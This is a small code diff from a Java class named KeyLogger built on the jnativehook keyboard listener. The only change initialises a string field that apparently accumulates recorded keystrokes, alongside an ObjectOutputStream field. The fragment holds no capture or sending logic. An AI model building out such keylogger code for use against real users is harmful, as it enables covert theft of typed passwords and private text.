@@ -20,7 +20,7 @@ import org.jnativehook.keyboard.NativeKeyListener;
 
 
 public class KeyLogger implements NativeKeyListener {
-	public volatile static String record;
+	public volatile static String record = "";
 	//public volatile static int count = 0;
 	public volatile static boolean flag;
 	public static ObjectOutputStream oos;
